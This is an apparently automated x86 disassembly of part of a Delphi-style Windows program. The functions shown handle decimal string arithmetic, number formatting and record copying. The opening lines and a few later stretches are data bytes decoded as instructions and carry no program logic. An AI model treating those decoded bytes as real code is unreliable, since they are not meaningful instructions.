or [ ecx + 0x73 ] eax
dec ecx
inc edi
add [ edi + eax * 4 + 0x47 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41090002 ] al
js r-xdata
inc ecx
add [ eax - 0x44 ] dl
inc ecx
add [ ebx ] cl
push esp
inc esi
dec ebp
push esp
inc edx
arpl [ esp + eax * 2 + 0x61 ] sp
cmp al 0xbd
jns r-xdata
add ah ah
mov [ edi ] eax
pop eax
mov [ edi ] es
movsb [ edi ] [ esi ]
mov [ edi ] es
pop eax
pushad
inc ecx
add [ eax + 0x5c ] al
inc ecx
add ah bh
mov [ edi ] es
sbb al 0x61
inc ecx
add ah dh
inc cx
add [ eax ] al
inc ecx
add [ eax ] dh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add [ edi ] 0x14
add [ eax ] al
add [ ebx + ebp * 2 + 0x35d80041 ] al
inc eax
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
imul ebp [ edi + 0x6e ] 0x82c4c08b
inc edi
add [ eax ] al
pop ecx
mov [ fs : eax ] edx
push sub_4784cf
lea eax [ ebp - 0x4 ]
call sub_404120
retn
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor ecx ecx
jb r-xdata
outsb
je r-xdata
je r-xdata
inc edi
add [ eax - 0x70 ] ah
inc ecx
add [ 0x4d460600 ] al
push esp
inc edx
arpl [ ebp + eax ] sp
mov esp 0xa8004010
xchg [ edi ] al
enter 0x4787 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or al [ ecx + 0x73 ]
inc ebx
inc edx
arpl [ esp + eax * 2 + 0x61 ] sp
je r-xdata
nop
js r-xdata
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5efe4d35 ]
mov eax 0xe8004781
pop ebx
aaa
stc
imul ebp [ esi + 0x67 ] 0x83ec8b55
add al 0x0
or [ ecx + 0x73 ] al
push ebx
adc [ eax ] al
pushfd
xchg [ edi ] al
mov esp 0x1004787
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410a0003 ] al
adc [ eax ] al
loopne r-xdata
jb r-xdata
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
sbb [ edi + 0x41 ] 0x0
aam 0x60
add [ eax ] al
in al dx
pop [ ecx ]
fdiv [ 0x35e40040 ]
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ esp + edi * 4 ] ah
inc ecx
add [ edi * 4 - 0x42c3ffbf ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx + 0x280047 ] al
mov eax ebx
call sub_4092d8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
xor eax eax
pop edx
pop ecx
or ecx [ ebp - 0x36cc0bab ]
insd
popad
insb
insb
dec ecx
outsb
je r-xdata
jae r-xdata
inc edi
add [ esi + eax * 4 + 0x10047 ] bh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jae r-xdata
inc ecx
outsb
arpl [ ecx - 0x54 ] di
adc [ eax ] al
hlt
or al [ ecx + 0x73 ]
push ebx
jae r-xdata
add [ ecx ] cl
inc ecx
jne r-xdata
sub_478468
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4784c8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax ebx
call sub_4092d8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4784cf
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_478508
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
call sub_47b1bc
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_47853c
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
call sub_47ae60
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_478570
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
add edx 0x4
call sub_47af94
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_47859c
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
add edx 0x4
call sub_47b150
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_4785f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47863d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_47b4ec
mov eax [ ebp - 0xc ]
call sub_409a64
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478644
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_47864c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47868d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_47b4ec
mov eax [ ebp - 0x4 ]
call sub_4086fc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478694
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_4786bc
push ebx
push esi
push edi
add esp 0xffffffdc
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_478d1c
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_4786e4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_478744
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x28 ]
call sub_409a04
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
call sub_478d1c
lea esi [ ebp - 0x24 ]
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47874b
lea eax [ ebp - 0x28 ]
call sub_404120
retn
sub_478754
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x28 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4787ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x28 ]
mov eax esi
call sub_4085c0
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
call sub_478d1c
lea esi [ ebp - 0x24 ]
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4787b5
lea eax [ ebp - 0x28 ]
call sub_404120
retn
sub_4787e8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403360
lea edx [ edi + 0x4 ]
mov eax esi
mov ecx 0x22
call sub_4029b0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_478830
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4788d0
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0xc ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409a04
mov eax [ ebp - 0x48 ]
lea edx [ ebp - 0x22 ]
call sub_478d1c
mov ax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x22 ]
mov ecx esi
call sub_47aa3c
test al al
jne r-xdata
add esp 0xfffffff0
call sub_4036f4
lea ecx [ ebp - 0x44 ]
xor edx edx
mov eax edi
call sub_4787e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4788d7
lea eax [ ebp - 0x4c ]
mov edx 0x2
call sub_404144
retn
lea edx [ ebp - 0x4c ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x4c ]
call sub_4784f0
sub_4788d7
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4788f8
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x48 ] ebx
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_47897f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x22 ]
mov eax esi
call sub_478d1c
mov ax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x22 ]
mov cx [ ebp + 0xc ]
call sub_47aa3c
test al al
jne r-xdata
add esp 0xfffffff0
call sub_4036f4
lea ecx [ ebp - 0x44 ]
xor edx edx
mov eax edi
call sub_4787e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478986
lea eax [ ebp - 0x48 ]
call sub_404120
retn
lea edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x48 ]
call sub_4784f0
sub_478986
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4789a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ ecx + 0x4 ]
mov ecx eax
xor edx edx
mov eax esi
call sub_4787e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4789f4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478b1e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_416060
xor eax eax
push ebp
push sub_478b01
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_416070
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4160fc
test al al
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_416060
xor eax eax
push ebp
push sub_478ad4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x5
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41607c
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push 0x8
mov cx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_478830
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_416068
retn
push 0x20
push 0x8
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_416108
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4788f8
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478b08
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_416068
retn
sub_478b2c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_478c46
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x4 ]
jne r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415bec
mov eax esi
sub ax 0x8
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x8 ]
call sub_4785e0
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
call sub_404978
mov ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4160b0
jmp r-xdata
sub ax 0xf8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478c4d
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x18 ]
call sub_40482c
retn
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x8 ]
call sub_4785e0
mov ecx [ ebp - 0x20 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4160a4
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_416060
xor eax eax
push ebp
push sub_478c0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x14 ] 0x5
mov eax [ ebx + 0x8 ]
add eax 0x4
call sub_478d78
fstp [ ebp - 0xc ]
fwait
push esi
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41607c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_416068
retn
sub_478c58
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ax [ ebx + 0x4 ]
mov [ edi ] ax
mov ecx [ esi + 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4789a8
mov [ edi + 0x8 ] eax
mov edx esi
mov eax ebx
call sub_416090
test al al
je r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_416070
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_478ca4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x1
jb r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_478530
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_478564
jmp r-xdata
dec ebx
je r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_478570
jmp r-xdata
dec ebx
je r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_47859c
jmp r-xdata
jmp r-xdata
call sub_416034
sub_478cfc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4785c8
mov edx [ ebp + 0x8 ]
mov [ edx ] al
pop esi
pop ebx
pop ebp
retn 0x4
sub_478d1c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_478d6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47a5a0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478d71
lea eax [ ebp - 0x4 ]
call sub_404120
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_478468
sub_478d78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_478dc0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_47b4ec
mov eax [ ebp - 0xc ]
call sub_409a64
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478dc7
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_478dd0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478eee
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404308
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_404724
mov edi eax
test di di
jne r-xdata
add si di
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404174
cmp si di
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043e0
movsx edx si
cmp eax edx
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4045e0
movsx edx si
dec edx
add eax edx
lea edx [ eax + 0x1 ]
cmp [ edx ] 0x35
jb r-xdata
test si si
jle r-xdata
mov dl [ eax ]
inc edx
mov [ eax ] dl
jmp r-xdata
cmp [ eax ] 0x39
jbe r-xdata
cmp [ eax ] 0x39
ja r-xdata
mov eax [ ebp - 0x8 ]
push eax
movsx ecx si
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404640
jmp r-xdata
mov [ eax ] 0x30
lea eax [ ebp - 0x10 ]
push eax
movsx ecx si
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404640
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40442c
jmp r-xdata
cmp bl [ eax ]
je r-xdata
cmp bl [ eax ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478ef5
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404144
retn
dec esi
dec eax
cmp bl [ eax ]
je r-xdata
mov [ eax ] 0x30
mov dl [ eax ]
inc edx
mov [ eax ] dl
sub_478f08
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_404174
jmp r-xdata
mov eax [ ebx ]
call sub_4043e0
dec eax
jle r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
cmp [ eax ] 0x30
je r-xdata
push ebx
mov eax [ ebx ]
call sub_4043e0
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404640
sub_478f44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045d0
mov eax [ ebp - 0x8 ]
call sub_4045d0
xor eax eax
push ebp
push sub_478fea
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_478f08
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_4041b8
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_4043e0
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x8 ]
call sub_4043e0
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
cmp ebx eax
jle r-xdata
mov ebx 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408180
mov ebx eax
or ebx 0xffffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478ff1
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404144
retn
sub_478ff8
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4045d0
mov eax [ ebp - 0x8 ]
call sub_4045d0
xor eax eax
push ebp
push sub_479190
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_478f44
dec eax
jle r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x4 ]
call sub_404174
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404174
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_404174
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_404174
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
mov eax [ ebp + 0xc ]
mov [ eax ] edi
jmp r-xdata
test esi esi
jle r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_404308
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov edx [ edx ]
call sub_404724
mov esi eax
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_404308
mov eax [ ebp - 0x14 ]
mov edx [ ebp + 0x1c ]
mov edx [ edx ]
call sub_404724
mov edi eax
test esi esi
jne r-xdata
test edi edi
jle r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx ebx
call sub_404308
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov eax [ eax ]
xor ecx ecx
call sub_40d108
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_404174
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
sub eax esi
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x10 ]
dec [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xffffff01
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479197
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_404144
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
mov edx ebx
call sub_404308
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x1c ]
mov eax [ eax ]
xor ecx ecx
call sub_40d108
mov edx [ ebp - 0x20 ]
mov eax [ ebp + 0x1c ]
call sub_404174
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax edi
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov eax [ ebp + 0xc ]
dec [ eax ]
sub_4791a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x1 ] dl
mov esi [ ebp + 0x8 ]
mov ebx eax
sub bl 0x30
mov al [ ebp - 0x1 ]
sub al 0x30
add bl al
add bl [ edi ]
cmp bl 0x9
jbe r-xdata
mov eax esi
mov edx ebx
add dl 0x30
call sub_404308
mov [ edi ] 0x0
mov eax esi
mov edx ebx
sub dl 0xa
add dl 0x30
call sub_404308
mov [ edi ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax esi
mov edx r-xdata
call sub_404174
cmp [ esi ] 0x0
jne r-xdata
sub_479210
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov edi [ ebp + 0x8 ]
mov dl [ ebp - 0x1 ]
sub dl 0x30
add dl [ esi ]
mov ebx eax
sub bl 0x30
sub bl dl
cmp bl 0x9
jbe r-xdata
mov eax edi
mov edx ebx
add dl 0x30
call sub_404308
mov [ esi ] 0x0
mov eax edi
mov edx ebx
add dl 0xa
add dl 0x30
call sub_404308
mov [ esi ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_479260
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_479397
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404174
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_40452c
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47939e
lea eax [ ebp - 0x8 ]
call sub_404120
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
mov edx ebx
call sub_404174
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40452c
jne r-xdata
mov [ ebp - 0x19 ] 0x0
mov eax ebx
call sub_4045e0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4045e0
mov [ ebp - 0x10 ] eax
mov eax ebx
call sub_4043e0
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_42e3c8
mov ebx eax
mov eax esi
call sub_404120
test ebx ebx
jle r-xdata
cmp [ ebp - 0x19 ] 0x0
jbe r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0x1
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40442c
mov [ ebp - 0x1a ] 0x30
mov edx [ ebp - 0xc ]
mov al [ edx + eax ]
mov [ ebp - 0x1a ] al
jmp r-xdata
mov [ ebp - 0x1b ] 0x30
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov al [ eax + edx ]
mov [ ebp - 0x1b ] al
jmp r-xdata
cmp ebx [ ebp - 0x14 ]
jg r-xdata
mov eax edi
sub eax ebx
mov edx [ ebp - 0x14 ]
sub edx ebx
mov [ ebp - 0x18 ] edx
cmp edi ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x19 ]
mov dl [ ebp - 0x1b ]
mov al [ ebp - 0x1a ]
call sub_4791a4
mov ecx [ esi ]
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_40442c
inc ebx
dec [ ebp - 0x20 ]
jne r-xdata
sub_4793c0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov edi edx
